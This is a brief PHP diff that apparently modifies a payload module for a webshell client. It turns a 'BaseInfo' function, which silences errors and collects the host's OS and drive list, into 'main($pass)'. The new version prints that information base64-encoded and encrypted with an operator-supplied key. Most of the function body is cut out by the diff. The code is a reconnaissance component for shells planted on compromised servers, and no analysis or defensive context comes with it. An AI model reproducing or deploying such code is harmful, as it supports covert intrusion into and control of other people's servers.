@@ -1,6 +1,5 @@
-error_reporting(0);
-%v
-function BaseInfo()
+<?
+function main($pass)
 {
     $driveList = "";
     if (stristr(PHP_OS, "windows") || stristr(PHP_OS, "winnt")) {
@@ -29,6 +28,5 @@ function BaseInfo()
     $res["status"] = "ok";
     $res["msg"] = base64_encode(json_encode($R));
     $res = json_encode($res);
-    return $res;
+    echo function_exists("encrypt") ? encrypt($res,$pass): $res;
 }
-echo function_exists("encrypt") ? encrypt(BaseInfo(),$pass) : "";
